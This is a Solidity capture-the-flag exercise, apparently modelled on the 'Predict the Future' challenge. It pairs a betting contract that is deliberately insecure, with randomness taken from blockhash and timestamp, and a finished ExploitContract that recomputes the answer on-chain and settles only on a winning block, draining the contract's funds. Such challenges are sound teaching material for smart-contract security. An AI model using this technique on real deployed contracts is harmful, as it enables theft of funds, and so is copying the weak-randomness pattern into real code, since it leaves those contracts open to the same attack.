// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
// import "forge-std/console.sol";

contract PredictTheFuture {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10;

        guesser = address(0);
        if (guess == answer) {
            (bool ok, ) = msg.sender.call{value: 2 ether}("");
            require(ok, "Failed to send to msg.sender");
        }
    }
}

contract ExploitContract {
    PredictTheFuture public predictTheFuture;

    constructor(PredictTheFuture _predictTheFuture) {
        predictTheFuture = _predictTheFuture;
    }

    // Write your exploit code below
    uint256 guessedAt;
    uint8 guess;

    receive() external payable {}

    function guessNow(uint8 guess_) external payable {
        guess = guess_;
        predictTheFuture.lockInGuess{value: 1 ether}(guess);
        guessedAt = block.number;
    }

    function trySettle() external returns (bool) {
        if (guessedAt + 1 > block.number) {
            return false;
        }

        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10;
        // console.log("tryToSettle()", answer);

        if (answer == guess) {
            predictTheFuture.settle();
            return true;
        } else {
            return false;
        }
    }
}
